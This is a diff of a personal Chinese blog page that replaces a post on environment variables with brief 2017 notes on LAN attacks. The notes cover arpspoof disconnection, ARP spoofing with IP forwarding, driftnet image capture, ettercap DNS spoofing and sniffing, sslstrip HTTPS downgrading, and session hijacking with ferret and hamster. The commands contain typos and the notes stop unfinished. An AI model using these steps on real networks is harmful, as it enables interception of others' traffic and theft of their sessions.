@@ -3,19 +3,19 @@
 <head>
   <meta charset="utf-8">
   
-  <title>环境变量 | Merl1ng</title>
+  <title>局域网 | Merl1ng</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="把路径添加到path后面">
+  <meta name="description" content="一、局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig 二、arp 欺骗先输入 ech0 1&amp;gt;/proc/sys/net/ipv4/ip_forward 无回显可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forwar">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="环境变量">
-<meta property="og:url" content="http://Merl1ng.com/2017/04/23/环境变量/index.html">
+<meta property="og:title" content="局域网">
+<meta property="og:url" content="http://Merl1ng.com/2017/05/30/局域网/index.html">
 <meta property="og:site_name" content="Merl1ng">
-<meta property="og:description" content="把路径添加到path后面">
-<meta property="og:updated_time" content="2017-04-23T05:08:45.175Z">
+<meta property="og:description" content="一、局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig 二、arp 欺骗先输入 ech0 1&amp;gt;/proc/sys/net/ipv4/ip_forward 无回显可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forwar">
+<meta property="og:updated_time" content="2017-05-30T15:35:18.392Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="环境变量">
-<meta name="twitter:description" content="把路径添加到path后面">
+<meta name="twitter:title" content="局域网">
+<meta name="twitter:description" content="一、局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig 二、arp 欺骗先输入 ech0 1&amp;gt;/proc/sys/net/ipv4/ip_forward 无回显可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forwar">
   
     <link rel="alternate" href="/atom.xml" title="Merl1ng" type="application/atom+xml">
   
@@ -64,10 +64,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-环境变量" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-局域网" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2017/04/23/环境变量/" class="article-date">
-  <time datetime="2017-04-23T05:08:45.174Z" itemprop="datePublished">2017-04-23</time>
+    <a href="/2017/05/30/局域网/" class="article-date">
+  <time datetime="2017-05-30T15:13:26.000Z" itemprop="datePublished">2017-05-30</time>
 </a>
     
   </div>
@@ -78,7 +78,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      环境变量
+      局域网
     </h1>
   
 
@@ -86,12 +86,17 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>把路径添加到path后面</p>
+        <p>一、局域网断网攻击<br>虚拟机 kali linux<br>arpspoof -i 网卡 -t ip 网关<br>查别人的 ip fping-asg x.0/24<br>linux ifconfig windows ipcomfig</p>
+<p>二、arp 欺骗<br>先输入 ech0 1&gt;/proc/sys/net/ipv4/ip_forward 无回显<br>可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forward<br>再arpspoof …</p>
+<p>三、driffnet 获取本机网卡图片<br>driffnet -i 网卡<br>会弹一个小窗口<br>可在/tmp内找到图片</p>
+<p>四、http<br>ettercap dns欺骗 流量嗅探<br>先arp欺骗 再 ettercap-Tq-i eth0<br>(Tq 启动文本模式 q安静模式)</p>
+<p>五、https<br>sslstrip 将https链接还原为http （缺点：证书错误）<br>首先设置 使用 vim esc+:q!不保存退出 esc+:wq保存退出<br>vim/etc/ettercap/etter.conf<br>光标移动到 linux 删除下两个# 设置完成<br>sslstrip -a -f -k</p>
+<p>六、会话劫持<br>wireshark 抓包 ferret重新生成抓包后文件 hamster重放流量<br>way1 先arp欺骗<br>未完持续…</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Merl1ng.com/2017/04/23/环境变量/" data-id="cj3bq6trl0002p4euyor0ycw0" class="article-share-link">Share</a>
+      <a data-url="http://Merl1ng.com/2017/05/30/局域网/" data-id="cj3bq6tr10000p4eul6xgec82" class="article-share-link">Share</a>
       
       
     </footer>
@@ -100,20 +105,15 @@
     
 <nav id="article-nav">
   
-    <a href="/2017/04/14/First/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/04/23/环境变量/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          First
+          环境变量
         
       </div>
     </a>
   
-  
-    <a href="/2017/05/30/局域网/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">局域网</div>
-    </a>
   
 </nav>
 
